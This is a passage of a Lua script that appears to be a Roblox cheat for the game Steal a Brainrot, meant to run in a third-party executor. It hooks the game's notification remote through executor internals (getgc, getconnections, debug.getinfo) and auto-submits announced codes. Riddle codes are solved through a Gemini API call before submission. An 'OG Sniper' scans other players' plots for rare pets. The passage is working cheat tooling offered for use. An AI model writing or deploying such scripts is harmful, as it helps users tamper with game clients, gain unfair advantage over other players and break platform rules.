        "- Favorite color = BLUE. Age = 24. Cat name = NOVA.",
    }, "\n")

    local context = ""
    local r = LiveRiddleIntel.rankings
    if LiveRiddleIntel.ready then
        local bits = {}
        for _, category in ipairs({"income", "mutations", "traits"}) do
            local rows = r[category]
            if rows and #rows > 0 then
                bits[#bits+1] = category .. ": highest=" .. rows[1].name
                    .. ", lowest=" .. rows[#rows].name
            end
        end
        if LiveRiddleIntel.latestAnimal and LiveRiddleIntel.latestSource and
            LiveRiddleIntel.latestSource:find("Complete",1,true) then
            bits[#bits+1]="latest (complete replicated metadata): "..LiveRiddleIntel.latestAnimal
        end
        bits[#bits+1]="worst brainrot riddle answer: Noobini Pizzanini"
        if #bits > 0 then context = "Game-sourced rankings: " .. table.concat(bits, "; ") .. "\n" end
    end
    local userPrompt = context .. "Question: " .. qRaw .. "\nReply with one line: CODE: YOURANSWER"
    local lastErr = "no model worked"

    for _, model in ipairs(order) do
        stat("AI thinking…")
        local url = "https://generativelanguage.googleapis.com/v1beta/models/" .. model .. ":generateContent?key=" .. key
        local bodyTable = {
            system_instruction = { parts = { { text = systemPrompt } } },
            contents = { { role = "user", parts = { { text = userPrompt } } } },
            generationConfig = { temperature = 0.05, maxOutputTokens = 64, topP = 0.8 },
        }
        local body = HttpService:JSONEncode(bodyTable)
        local ok, res = pcall(httpRequest, {
            Url = url,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = body,
        })
        if ok and res then
            local bodyStr = res.Body or res.body or ""
            if type(bodyStr) ~= "string" then bodyStr = tostring(bodyStr) end
            local pOk, parsed = pcall(HttpService.JSONDecode, HttpService, bodyStr)
            if pOk and type(parsed) == "table" and not parsed.error then
                local rawAns = ""
                local cands = parsed.candidates
                if type(cands) == "table" and cands[1] then
                    local content = cands[1].content
                    local parts = content and content.parts
                    if type(parts) == "table" then
                        local buf = {}
                        for _, p in ipairs(parts) do
                            if type(p) == "table" and type(p.text) == "string" then
                                buf[#buf + 1] = p.text
                            end
                        end
                        rawAns = table.concat(buf, "")
                    end
                end
                local answer = trim(rawAns):upper()
                local code = answer:match("CODE:%s*([%w%|%s%-]+)")
                if code then answer = code end
                answer = answer:gsub("^CODE%s*:?", ""):gsub("[^A-Z0-9]", "")
                answer = answer:match("([^\n\r]+)") or answer
                if answer ~= "" and #answer <= 48 then
                    GEMINI_MODEL = model
                    calciumRiddleAnswerCache[qRaw:lower()]=answer
                    stat("AI: " .. answer:sub(1, 40))
                    return answer, nil, nil
                end
            end
        end
        lastErr = "fail " .. model
    end

    return nil, nil, lastErr
end

function extractNumber(text)
    if not text then return nil end
    local n = tostring(text):match("(%d+)%s*$")
    if not n then return nil end
    local num = tonumber(n)
    if num and num > 13 then return n end
    return nil
end

function extractTimesMultiplier(text)
    local l = text:lower()
    if l:find("twice")  then return 2 end
    if l:find("thrice") then return 3 end
    local n = l:match("(%d+)%s*times")
    if n then
        n = tonumber(n)
        if n and n >= 2 and n <= 10 then return n end
    end
    return nil
end

function stripMultiplierText(text)
    local s = text
    s = s:gsub("%s*%d+%s*[Tt]imes%s*", " ")
    s = s:gsub("%s*[Tt]wice%s*",        " ")
    s = s:gsub("%s*[Tt]hrice%s*",       " ")
    return trim(s)
end

function stripTrailingNumber(text)
    return trim(text:gsub("%s+%d+%s*$", ""))
end

function isMultiPartQuestion(text)
    local l = tostring(text or ""):lower()
    if l:find("%s+plus%s+") or l:find("%s+%+%s+") or l:find("%s+and%s+") then return true end
    if l:find(",") or l:find("%s+&%s+") then return true end
    return false
end

function splitAllParts(text)
    local raw = trim(tostring(text or ""))
    if raw == "" then return { "" } end

    local startParts, endParts = {}, {}
    local work = raw

    work = work:gsub("([%w%s%-%']+?)%s+at%s+the%s+end", function(subj)
        subj = trim(subj)
        if subj ~= "" then endParts[#endParts + 1] = subj end
        return " "
    end)
    work = work:gsub("([%w%s%-%']+?)%s+at%s+the%s+start", function(subj)
        subj = trim(subj)
        if subj ~= "" then startParts[#startParts + 1] = subj end
        return " "
    end)

    work = work:gsub("%s+plus%s+", " and ")
    work = work:gsub("%s+%+%s+", " and ")
    work = work:gsub("%s+then%s+", " and ")
    work = work:gsub("%s*,%s*", " and ")
    work = work:gsub("%s+&%s+", " and ")

    local mid = {}
    for part in (work .. " and "):gmatch("(.-)%s+and%s+") do
        part = trim(part)
        part = part:gsub("^[%s,]+", ""):gsub("[%s,]+$", "")
        part = part:gsub("^[Ww]hat%s+", "what ")
        local low = part:lower()
        if part ~= "" and low ~= "and" and low ~= "or" then
            mid[#mid + 1] = part
        end
    end

    local parts = {}
    for _, p in ipairs(startParts) do parts[#parts + 1] = p end
    for _, p in ipairs(mid) do parts[#parts + 1] = p end
    for _, p in ipairs(endParts) do parts[#parts + 1] = p end
    if #parts == 0 then parts[1] = raw end
    return parts
end

function resolvePartOffline(part)
    local multiplier = extractTimesMultiplier(part)
    local q = stripMultiplierText(part)
    if not tostring(q):match("^%s*%d+%s*$") then
        q = stripTrailingNumber(q)
    end
    q = trim(q)
    if q == "" then return nil, q end

    local onlyNum = q:match("^%d+$")
    if onlyNum then
        return (multiplier and string.rep(onlyNum, multiplier) or onlyNum), q
    end

    local candidates = { q }
    local ql = q:lower()
    candidates[#candidates + 1] = ql
    candidates[#candidates + 1] = ql:gsub("^what%s+is%s+", ""):gsub("^what%s+are%s+", "")
    candidates[#candidates + 1] = ql:gsub("^who%s+is%s+", ""):gsub("^who%s+did%s+", "")
    candidates[#candidates + 1] = ql:gsub("^my%s+", "")

    local seen = {}
    for _, cand in ipairs(candidates) do
        cand = trim(tostring(cand or ""):gsub("[%?%.%,!]", ""):gsub("%s+", " "))
        if cand ~= "" and not seen[cand] then
            seen[cand] = true
            local a = localExactAnswer(cand)
            if a then
                local clean = tostring(a):upper():gsub("%s+", ""):gsub("[%?%.%,!]", "")
                if clean ~= "" and clean ~= "AND" and clean ~= "OR" then
                    return (multiplier and string.rep(clean, multiplier) or clean), q
                end
            end
            if SAB_DB[cand] then
                local clean = tostring(SAB_DB[cand]):upper():gsub("%s+", "")
                if clean ~= "" then
                    return (multiplier and string.rep(clean, multiplier) or clean), q
                end
            end
        end
    end

    if not q:find("?") and #q <= 24 and not q:match("%s") then
        local lit = q:upper():gsub("[^%w]", "")
        if lit ~= "" and #lit >= 2 then
            return (multiplier and string.rep(lit, multiplier) or lit), q
        end
    end

    return nil, q
end

function solveRiddle(text, statusCb)
    local multi = isMultiPartQuestion(text)

    if not multi then
        local fullHit = localExactAnswer(text)
        if fullHit and fullHit ~= "" then
            local out = tostring(fullHit):upper():gsub("%s+", ""):gsub("[%?%.%,!]", "")
            if statusCb then statusCb("DB: " .. out:sub(1, 48)) end
            return out, nil, nil
        end
    end

    local suffix = extractNumber(text)
    local parts = splitAllParts(text)
    local answers = {}
    local needAI = {}

    for i, part in ipairs(parts) do
        local r, qq = resolvePartOffline(part)
        if r and r ~= "" then
            answers[i] = r
        else
            needAI[#needAI + 1] = { i = i, q = qq or tostring(part) }
        end
    end

    if #needAI == 0 and #parts > 0 then
        local ordered = {}
        for i = 1, #parts do
            if answers[i] then ordered[#ordered + 1] = answers[i] end
        end
        local out = table.concat(ordered, "")
        if suffix and out:sub(-#suffix) ~= suffix then
            local already = false
            for _, a in ipairs(ordered) do
                if a == suffix then already = true break end
            end
            if not already then out = out .. suffix end
        end
        if statusCb then statusCb("DB multi: " .. out:sub(1, 48)) end
        return out, nil, nil
    end

    -- Resolve the remaining few unknown segments independently; never
    -- pretend that a partial concatenation is a verified complete answer.
    for i=1,math.min(#needAI,4) do
        local entry=needAI[i]
        local a=select(1,queryAI(entry.q,statusCb))
        if a then
            local clean=tostring(a):upper():gsub("[^A-Z0-9]", "")
            if clean~="" then answers[entry.i]=clean end
        end
    end

    local ordered, missingNames = {}, {}
    for i = 1, #parts do
        if answers[i] then
            ordered[#ordered + 1] = answers[i]
        else
            missingNames[#missingNames + 1] = tostring(parts[i]):sub(1, 30)
        end
    end

    if #missingNames>0 then
        return nil,nil,"Unresolved: "..table.concat(missingNames," | ")
    end

    local out = table.concat(ordered, "")
    if suffix and out:sub(-#suffix) ~= suffix then
        local already = false
        for _, a in ipairs(ordered) do
            if a == suffix then already = true break end
        end
        if not already then out = out .. suffix end
    end
    return out, nil, nil
end

function resolveNotifyRemote()
    if _G.PhiNotifyRemote then return _G.PhiNotifyRemote end
    local ok, Net = pcall(function()
        return ReplicatedStorage:WaitForChild("Packages", 5):WaitForChild("Net", 5)
    end)
    if not ok or not Net then return nil end
    local getinfo = debug and (debug.getinfo or debug.info)
    if getgc and getinfo and getconnections then
        for _, d in ipairs(Net:GetDescendants()) do
            if d:IsA("RemoteEvent") then
                local ok2, cs = pcall(getconnections, d.OnClientEvent)
                if ok2 then
                    for _, c in ipairs(cs) do
                        local f, fn = pcall(function() return c.Function end)
                        if f and type(fn) == "function" then
                            local i, info = pcall(getinfo, fn)
                            if i and tostring(info.short_src or info.source or ""):find("NotificationController", 1, true) then
                                return d
                            end
                        end
                    end
                end
            end
        end
    end
    return nil
end

function calciumStripRich(text)
    if type(text) ~= "string" then return tostring(text) end
    return (text:gsub("<[^>]->", ""))
end

local calciumCollectBuffer = {}
local _riddleSolving = false

function partNeedsRiddle(part)
    local s = trim(tostring(part or ""))
    if s == "" then return false end
    if s:find("%?") then return true end
    if s:match("^%d+$") then return false end
    local compact = s:gsub("%s+", "")
    if compact:match("^[A-Za-z0-9_%-]+$") and #compact >= 2 and #compact <= 48 and not s:find("%s") then
        return false
    end
    local lower = s:lower():gsub("^%s+", "")
    if lower:match("^what[%s']") or lower:match("^who[%s']") or lower:match("^when[%s']")
        or lower:match("^where[%s']") or lower:match("^how[%s']") or lower:match("^which[%s']") then
        return true
    end
    if lower:find("my name", 1, true) or lower:find("my age", 1, true)
        or lower:find("favorite ", 1, true) then
        return true
    end
    return false
end

function lowerHasAnd(t)
    local l = tostring(t or ""):lower()
    return l:find("%sand%s") ~= nil or l:find("%sadd%s") ~= nil
end

function shouldSolveAsRiddle(text)
    if not text or text == "" then return false end
    if text:find("%?") then return true end
    if text:find(",") or lowerHasAnd(text) then
        local parts = splitAllParts(text)
        for _, p in ipairs(parts) do
            if partNeedsRiddle(p) then return true end
        end
        if #parts > 1 then return true end
    end
    if partNeedsRiddle(text) then return true end
    if localExactAnswer(text) then return true end
    return false
end

function isCodePhrase(announcement)
    local upper = tostring(announcement or ""):upper()
    if upper:find("USE%s+CODE") then return true end
    if upper:find("THE%s+CODE%s+IS") then return true end
    if upper:find("CODE%s+IS") then return true end
    if upper:find("REDEEM%s+CODE") then return true end
    if upper:find("ENTER%s+CODE") then return true end
    return false
end

function extractExplicitCode(announcement)
    local t = tostring(announcement or "")
    local upper = t:upper()
    local junk = {
        IS=true, THE=true, CODE=true, USE=true, FOR=true, NOW=true, HERE=true,
        THIS=true, THAT=true, PLEASE=true, REDEEM=true, ENTER=true, YOUR=true,
        A=true, AN=true, TO=true, AND=true, OR=true,
    }
    local patterns = {
        "USE%s+CODE%s*[:%-=]?%s*([%w_%-]+)",
        "THE%s+CODE%s+IS%s*[:%-=]?%s*([%w_%-]+)",
        "CODE%s+IS%s*[:%-=]?%s*([%w_%-]+)",
        "REDEEM%s+CODE%s*[:%-=]?%s*([%w_%-]+)",
        "ENTER%s+CODE%s*[:%-=]?%s*([%w_%-]+)",
        "CODE%s*[:%-=]%s*([%w_%-]+)",
    }
    for _, pat in ipairs(patterns) do
        local code = upper:match(pat)
        if code and #code >= 2 and #code <= 48 and not junk[code] then
            return code:gsub("[^A-Z0-9_%-]", "")
        end
    end
    return nil
end

function onCalciumAnnouncement(...)
    local text = calciumStripRich(tostring((...) or ""))
    text = text:match("^%s*(.-)%s*$") or ""
    if text == "" then return end

    do
        local phraseHit = isCodePhrase(text)
        local explicit = extractExplicitCode(text)
        if phraseHit or (explicit and #explicit >= 2) then
            local dedupeKey = explicit or ("phrase:" .. tostring(text):upper():sub(1, 48))
            if _seen[dedupeKey] then return end
            _seen[dedupeKey] = true
            task.delay(2, function() _seen[dedupeKey] = nil end)

            local wasOff = not autoWriteEnabled
            autoWriteEnabled = true
            _enabled = true
            pcall(function()
                savedConfig.codeSniper = true
                if type(saveConfig) == "function" then saveConfig() end
            end)
            pcall(function()
                if AutoWriteButton then
                    local ti = TweenInfo.new(0.22, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
                    TweenService:Create(AutoWriteButton, ti, { BackgroundColor3 = COLORS.Accent }):Play()
                end
                if AutoWriteStroke then
                    TweenService:Create(AutoWriteStroke, TweenInfo.new(0.22), { Transparency = 0.62 }):Play()
                end
                if AutoWriteKnob then
                    local ti = TweenInfo.new(0.22, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
                    TweenService:Create(AutoWriteKnob, ti, {
                        BackgroundColor3 = COLORS.Window,
                        Position = UDim2.new(1, -22, 0.5, -10),
                    }):Play()
                end
            end)
            if wasOff then
                pcall(function()
                    if type(appendConsoleStatus) == "function" then
                        appendConsoleStatus("Code sniper", true)
                    end
                    setStatus("SNIPER ARMED (CODE phrase)", COLORS.Green)
                end)
            end

            if not explicit or #explicit < 2 then return end

            pcall(function()
                setStatus("CODE ALERT: " .. explicit, COLORS.Green)
                flashCode(explicit, COLORS.Green)
            end)

            -- A clearly written code is still ONE announcement.
            -- Route it through the ordinary announcement counter,
            -- not the immediate riddle submission branch.
            appendToBox(explicit)
            return
        end
    end

    if not autoWriteEnabled then return end

    if _riddleSolver and shouldSolveAsRiddle(text) then
        if _riddleSolving then return end
        if _seen[text] then return end
        _seen[text] = true
        task.delay(4, function() _seen[text] = nil end)

        _riddleSolving = true
        task.spawn(function()
            setStatus("Riddle: " .. text:sub(1, 48), COLORS.Text)
            local function statusCb(msg)
                setStatus(tostring(msg):sub(1, 60), COLORS.Dim)
            end
            local ok, a, _, e = pcall(solveRiddle, text, statusCb)
            if not ok then
                setStatus("Riddle error: " .. tostring(a):sub(1, 60), COLORS.Red)
                _riddleSolving = false
                return
            end
            local realAnswer, realErr = a, e
            if realAnswer and realAnswer ~= "" then
                realAnswer = tostring(realAnswer):upper():gsub("%s+", ""):gsub("[%?%.%,!]", "")
                local qCompact = text:upper():gsub("%s+", ""):gsub("[%?%.%,!]", "")
                if realAnswer == qCompact or #realAnswer < 2 then
                    setStatus("Riddle rejected (looks like question)", COLORS.Red)
                else
                    setStatus("Solved: " .. realAnswer, COLORS.Green)
                    flashCode(realAnswer, COLORS.Green)
                    -- Identical submission pipeline for riddles and regular codes.
                    submitCalciumShared(realAnswer, "riddle")
                end
            else
                setStatus("Riddle fail: " .. tostring(realErr or "no answer"):sub(1, 60), COLORS.Red)
            end
            _riddleSolving = false
        end)
        return
    end

    local captured = text:gsub("%s+", "")
    if captured == "" then return end

    if _seen[captured] then return end
    _seen[captured] = true
    task.delay(0.015, function() _seen[captured] = nil end)

    appendToBox(captured)
end

local NotifyRemote = resolveNotifyRemote()
local ListenConnection

if NotifyRemote then
    if getgenv then
        local previous = getgenv().CodeSniperNotifyConnection
        if previous then pcall(function() previous:Disconnect() end) end
    end

    ListenConnection = NotifyRemote.OnClientEvent:Connect(function(...)
        pcall(onCalciumAnnouncement, ...)
    end)

    if getgenv then
        getgenv().CodeSniperNotifyConnection = ListenConnection
    end
end

-- ============================================================
-- OG SNIPER LOADER
-- ============================================================
local function loadOGSniper()
    if getgenv and getgenv().CalciumOGSniperGui and getgenv().CalciumOGSniperGui.Parent then
        getgenv().CalciumOGSniperGui:Destroy()
        getgenv().CalciumOGSniperGui = nil
        if OGOpenBtn then OGOpenBtn.Text = "OPEN" end
        if OGSniperDot then OGSniperDot.BackgroundColor3 = COLORS.Dim end
        if setStatus then setStatus("OG Sniper closed", COLORS.Dim) end
        return
    end

    if OGOpenBtn then OGOpenBtn.Text = "CLOSING..." end

    local OGPlayers    = Players
    local OGTween      = TweenService
    local OGInput      = UserInputService
    local OGRun        = RunService
    local OGHttp       = HttpService
    local OGTeleport   = game:GetService("TeleportService")
    local OGLocal      = player
    local OGPlayerGui  = playerGui

    local GUI_NAME = "StaticsOGSniper"
    for _, old in ipairs(OGPlayerGui:GetChildren()) do
        if old.Name == GUI_NAME then old:Destroy() end
    end

    local chime = workspace:FindFirstChild("StaticsOGChime")
    if chime then chime:Destroy() end
    chime = Instance.new("Sound")
    chime.Name = "StaticsOGChime"
    chime.SoundId = "rbxassetid://6895079853"
    chime.Volume = 0.8
    chime.Parent = workspace

    local C = {
        bg        = Color3.fromRGB(12, 13, 18),
        header    = Color3.fromRGB(10, 12, 18),
        card      = Color3.fromRGB(12, 16, 26),
        stroke    = Color3.fromRGB(48, 54, 68),
        pink      = Color3.fromRGB(245, 248, 255),
        neonPink  = Color3.fromRGB(110, 180, 255),
        softPink  = Color3.fromRGB(150, 165, 190),
        white     = Color3.fromRGB(245, 248, 255),
        gray      = Color3.fromRGB(150, 165, 190),
        mute      = Color3.fromRGB(150, 165, 190),
        red       = Color3.fromRGB(255, 75, 85),
        green     = Color3.fromRGB(80, 220, 130),
    }
    local OG_ACCENT = C.neonPink
    local OG_GREEN  = C.green
    local OG_RED    = C.red

    local imageCache = {}
    local assetCache = {}
    local userCache = {}

    local function getRequestFn()
        return (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request) or (identifyexecutor and request)
    end

    local function toWikiName(displayName)
        local clean = (displayName or ""):match("^(.-)%s*%(") or displayName or ""
        clean = clean:gsub("^%s*(.-)%s*$", "%1")
        return clean:gsub(" ", "_")
    end

    local function fetchFandomImageUrl(displayName)
        if not displayName or displayName == "" then return nil end
        if imageCache[displayName] ~= nil then
            return imageCache[displayName] ~= false and imageCache[displayName] or nil
        end
        local requestFn = getRequestFn()
        local wikiName = toWikiName(displayName)
        local url = "https://stealabrainrot.fandom.com/wiki/" .. wikiName
        for attempt = 1, 3 do
            local body = ""
            if requestFn then
                local ok, response = pcall(function()
                    return requestFn({
                        Url = url,
                        Method = "GET",
                        Headers = {
                            ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                            ["Accept"] = "text/html,application/xhtml+xml",
                            ["Accept-Language"] = "en-US,en;q=0.5",
                            ["Cache-Control"] = "no-cache",
                        },
                    })
                end)
                if ok and response then
                    local code = response.StatusCode or response.status or response.Status or 0
                    if code == 200 or code == 0 then
                        body = response.Body or response.body or response.Data or ""
                    end
                end
            end
            if body == "" then pcall(function() body = game:HttpGet(url) end) end
            if body and body ~= "" then
                local ogImage = body:match('property="og:image"%s+content="([^"]+)"')
                    or body:match('content="([^"]+)"%s+property="og:image"')
                    or body:match('<meta%s+property="og:image"%s+content="([^"]+)"')
                    or body:match('property=%s*"og:image"%s+content=%s*"([^"]+)"')
                if ogImage and ogImage ~= "" then
                    ogImage = ogImage:gsub("&amp;", "&")
                    if ogImage:find("^https?://") then
                        imageCache[displayName] = ogImage
                        return ogImage
                    end
                end
                local img = body:match('src="(https://static%.wikia%.nocookie%.net[^"]+%.png[^"]*)"')
                    or body:match('src="(https://static%.wikia%.nocookie%.net[^"]+%.jpg[^"]*)"')
                    or body:match('data%-src="(https://static%.wikia%.nocookie%.net[^"]+)"')
                if img and img ~= "" then
                    img = img:gsub("/revision/latest.*", "")
                    imageCache[displayName] = img
                    return img
                end
                break
            end
            if attempt < 3 then task.wait(0.3 * attempt) end
        end
        imageCache[displayName] = false
        return nil
    end

    local TARGET_EXACT_ANIMALS = {
        ["meowl"] = true,
        ["john pork"] = true,
        ["strawberry elephant"] = true,
        ["skibidi toilet"] = true,
        ["dragon cannelloni"] = true,
    }

    local function isTargetAnimal(name)
        if not name or name == "" then return false end
        local lower = tostring(name):lower():gsub("<[^>]->", ""):gsub("%b()", ""):gsub("%b[]", "")
        lower = lower:gsub("^%s*(.-)%s*$", "%1")
        if lower:find("los ") or lower:find("los_") then return false end
        for target in pairs(TARGET_EXACT_ANIMALS) do
            if lower == target or lower:find(target, 1, true) then return true end
        end
        return false
    end

    local petModelCache = {}

    local function findPetModel(petName, mutation)
        if not petName or petName == "" then return nil end
        local cacheKey = tostring(petName):lower() .. "_" .. tostring(mutation or "none"):lower()
        if petModelCache[cacheKey] and petModelCache[cacheKey].Parent then
            return petModelCache[cacheKey]
        end
        local cleanName = tostring(petName):lower():gsub("<[^>]->", ""):gsub("%b()", ""):gsub("[%p%s]", "")
        local rawName = tostring(petName):lower():gsub("<[^>]->", ""):gsub("%b()", ""):gsub("^%s*(.-)%s*$", "%1")
        local mutClean = mutation and tostring(mutation):lower():gsub("[%p%s]", "") or ""
        local playerNames = {}
        for _, p in pairs(OGPlayers:GetPlayers()) do
            playerNames[string.lower(p.Name)] = true
            playerNames[string.lower(p.DisplayName)] = true
        end
        local function isTargetMatch(mName)
            local nClean = tostring(mName):lower():gsub("[%p%s]", "")
            local nLower = tostring(mName):lower()
            if mutClean ~= "" and mutClean ~= "none" then
                if nClean == (mutClean .. cleanName) or nClean == (cleanName .. mutClean) then return true end
                if nLower:find(mutClean, 1, true) and nLower:find(cleanName, 1, true) then return true end
            end
            if nClean == cleanName or nLower == rawName then return true end
            if #cleanName >= 4 and (nClean:find(cleanName, 1, true) or cleanName:find(nClean, 1, true)) then return true end
            return false
        end
        local bestModel = nil
        local bestScore = -1
        local function evaluateModel(v)
            if not v or not v:IsA("Model") then return end
            if playerNames[string.lower(v.Name)] then return end
            if not isTargetMatch(v.Name) then return end
            local cf, size = v:GetBoundingBox()
            local mag = size.Magnitude
            if mag > 70 then return end
            local parts = 0
            for _, d in ipairs(v:GetDescendants()) do
                if d:IsA("BasePart") then parts = parts + 1 end
            end
            if parts == 0 then return end
            local score = parts
            local vClean = tostring(v.Name):lower():gsub("[%p%s]", "")
            local vLower = tostring(v.Name):lower()
            if vClean == cleanName or vLower == rawName then score = score + 100 end
            if mutClean ~= "" and mutClean ~= "none" and vClean:find(mutClean, 1, true) then score = score + 50 end
            if score > bestScore then
                bestScore = score
                bestModel = v
            end
        end
        local plotsFolder = workspace:FindFirstChild("Plots")
        if plotsFolder then
            for _, v in ipairs(plotsFolder:GetDescendants()) do
                if v:IsA("Model") then evaluateModel(v) end
            end
        end
        if not bestModel then
            local rep = game:GetService("ReplicatedStorage")
            for _, v in ipairs(rep:GetDescendants()) do
                if v:IsA("Model") then evaluateModel(v) end
            end
        end
        if not bestModel then
            for _, v in ipairs(workspace:GetDescendants()) do
                if v:IsA("Model") then evaluateModel(v) end
            end
        end
        if bestModel then
            petModelCache[cacheKey] = bestModel
            return bestModel
        end
        return nil
    end

    local function applyMutationShader(clone, mutation)
        if not clone or not mutation or mutation == "" or mutation == "none" or mutation == "None" then return end
        local mutLower = tostring(mutation):lower():gsub("_", " ")
        local mColor, mMaterial, mTransparency
        if mutLower:find("diamond") then mColor = Color3.fromRGB(0, 220, 255); mMaterial = Enum.Material.Ice
        elseif mutLower:find("gold") then mColor = Color3.fromRGB(255, 215, 0); mMaterial = Enum.Material.Foil
        elseif mutLower:find("bloodrot") then mColor = Color3.fromRGB(255, 35, 35); mMaterial = Enum.Material.Neon
        elseif mutLower:find("candy") then mColor = Color3.fromRGB(255, 105, 180); mMaterial = Enum.Material.SmoothPlastic
        elseif mutLower:find("lava") then mColor = Color3.fromRGB(255, 90, 20); mMaterial = Enum.Material.Neon
        elseif mutLower:find("galaxy") then mColor = Color3.fromRGB(170, 70, 255); mMaterial = Enum.Material.Neon
        elseif mutLower:find("radio") then mColor = Color3.fromRGB(80, 255, 80); mMaterial = Enum.Material.Neon
        elseif mutLower:find("cursed") then mColor = Color3.fromRGB(150, 30, 230); mMaterial = Enum.Material.Neon
        elseif mutLower:find("divine") then mColor = Color3.fromRGB(255, 235, 140); mMaterial = Enum.Material.Neon
        elseif mutLower:find("cyber") then mColor = Color3.fromRGB(0, 255, 200); mMaterial = Enum.Material.Neon
        elseif mutLower:find("phantom") then mColor = Color3.fromRGB(120, 200, 255); mTransparency = 0.35
        elseif mutLower:find("rainbow") then mColor = Color3.fromRGB(255, 180, 220); mMaterial = Enum.Material.Neon
        end
        if mColor then
            pcall(function()
                for _, part in ipairs(clone:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.Color = mColor
                        if mMaterial then part.Material = mMaterial end
                        if mTransparency then part.Transparency = mTransparency end
                    elseif part:IsA("Decal") or part:IsA("Texture") then
                        part.Color3 = mColor
                    end
                end
            end)
        end
    end

    local function playPetAnimations(cloneModel, sourceModel)
        pcall(function()
            local animator = cloneModel:FindFirstChildWhichIsA("Animator", true)
            local hum = cloneModel:FindFirstChildOfClass("Humanoid")
            local ac = cloneModel:FindFirstChildWhichIsA("AnimationController", true)
            if not animator then
                if hum then
                    animator = hum:FindFirstChildOfClass("Animator") or Instance.new("Animator", hum)
                else
                    if not ac then ac = Instance.new("AnimationController"); ac.Parent = cloneModel end
                    animator = ac:FindFirstChildOfClass("Animator") or Instance.new("Animator", ac)
                end
            end
            local played = false
            if sourceModel then
                local srcAnim = sourceModel:FindFirstChildWhichIsA("Animator", true)
                    or (sourceModel:FindFirstChildOfClass("Humanoid") and sourceModel:FindFirstChildOfClass("Humanoid"):FindFirstChildOfClass("Animator"))
                if srcAnim then
                    for _, track in ipairs(srcAnim:GetPlayingAnimationTracks()) do
                        if track.Animation and track.Animation.AnimationId ~= "" then
                            pcall(function()
                                local t = animator:LoadAnimation(track.Animation)
                                t.Looped = true
                                t:Play()
                                played = true
                            end)
                        end
                    end
                end
            end
            if not played then
                local searchList = { cloneModel }
                if sourceModel then table.insert(searchList, sourceModel) end
                for _, root in ipairs(searchList) do
                    for _, d in ipairs(root:GetDescendants()) do
                        if d:IsA("Animation") and d.AnimationId ~= "" then
                            pcall(function()
                                local t = animator:LoadAnimation(d)
                                t.Looped = true
                                t:Play()
                                played = true
                            end)
                            if played then break end
                        end
                    end
                    if played then break end
                end
            end
        end)
    end

    local function optimizeCloneModel(clone)
        local hasJoints = false
        local primary = clone.PrimaryPart or clone:FindFirstChild("HumanoidRootPart") or clone:FindFirstChildWhichIsA("BasePart")
        for _, d in ipairs(clone:GetDescendants()) do
            if d:IsA("Motor6D") or d:IsA("Bone") then
                hasJoints = true
                break
            end
        end
        for _, d in ipairs(clone:GetDescendants()) do
            if d:IsA("Script") or d:IsA("LocalScript") or d:IsA("Highlight") or d:IsA("BillboardGui") or d:IsA("ProximityPrompt") or d:IsA("ParticleEmitter") or d:IsA("Beam") or d:IsA("Trail") then
                d:Destroy()
            elseif d:IsA("BasePart") then
                d.CanCollide = false
                d.CanQuery = false
                d.CanTouch = false
                d.LocalTransparencyModifier = 0
                if hasJoints then
                    d.Anchored = (d == primary)
                else
                    d.Anchored = true
                end
            end
        end
        local hum = clone:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
            hum.HealthDisplayType = Enum.HumanoidHealthDisplayType.AlwaysOff
        end
    end

    local function setupPetViewport(parentFrame, petName, mutation)
        if not parentFrame then return false end
        local existingVp = parentFrame:FindFirstChild("PetViewport")
        if existingVp then existingVp:Destroy() end
        local foundModel = findPetModel(petName, mutation)
        if not foundModel then return false end
        local vp = Instance.new("ViewportFrame")
        vp.Name = "PetViewport"
        vp.Size = UDim2.new(1, 0, 1, 0)
        vp.Position = UDim2.new(0, 0, 0, 0)
        vp.BackgroundTransparency = 1
        vp.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        vp.BorderSizePixel = 0
        vp.ZIndex = 5
        vp.LightColor = Color3.fromRGB(255, 255, 255)
        vp.LightDirection = Vector3.new(-1, -1, -1)
        vp.Ambient = Color3.fromRGB(180, 180, 180)
        vp.Parent = parentFrame
        local worldModel = Instance.new("WorldModel")
        worldModel.Parent = vp
        local vpCam = Instance.new("Camera")
        vpCam.Parent = vp
        vp.CurrentCamera = vpCam
        local clone = foundModel:Clone()
        optimizeCloneModel(clone)
        if mutation and mutation ~= "" and mutation ~= "none" and mutation ~= "None" then
            applyMutationShader(clone, mutation)
        end
        clone.Parent = worldModel
        playPetAnimations(clone, foundModel)
        local cf, size = clone:GetBoundingBox()
        local centerPos = cf.Position
        local maxDim = math.max(size.X, size.Y, size.Z)
        if maxDim < 1 then maxDim = 3 end
        if maxDim > 30 then maxDim = 6 end
        pcall(function()
            local currentPivot = clone:GetPivot()
            clone:PivotTo((currentPivot - centerPos) * CFrame.Angles(0, math.rad(180), 0))
        end)
        local dist = math.max(maxDim * 1.85, 3.8)
        local height = math.clamp(size.Y * 0.08, -0.3, 1.2)
        vpCam.FieldOfView = 50
        vpCam.CFrame = CFrame.new(Vector3.new(0, height, dist), Vector3.new(0, 0, 0))
        return true
    end

    local function extractLiveboardVisual(entry, parentBox, cleanName, mutation)
        if not entry or not parentBox then return false end
        local filler = entry:FindFirstChild("Filler") or entry
        local liveVp = nil
        for _, d in ipairs(filler:GetDescendants()) do
            if d:IsA("ViewportFrame") then
                liveVp = d
                break
            end
        end
        if not liveVp then
            for _, d in ipairs(entry:GetDescendants()) do
                if d:IsA("ViewportFrame") then
                    liveVp = d
                    break
                end
            end
        end
        if liveVp then
            local existing = parentBox:FindFirstChild("LiveViewport")
            if existing then existing:Destroy() end
            local cloneVp = liveVp:Clone()
            for _, c in ipairs(cloneVp:GetDescendants()) do
                if c:IsA("UIConstraint") or c:IsA("UIAspectRatioConstraint") or c:IsA("UISizeConstraint") or c:IsA("UIPadding") or c:IsA("UIGridLayout") or c:IsA("UIListLayout") then
                    c:Destroy()
                end
            end
            cloneVp.Name = "LiveViewport"
            cloneVp.AnchorPoint = Vector2.new(0, 0)
            cloneVp.Position = UDim2.new(0, 0, 0, 0)
            cloneVp.Size = UDim2.new(1, 0, 1, 0)
            cloneVp.SizeConstraint = Enum.SizeConstraint.RelativeXY
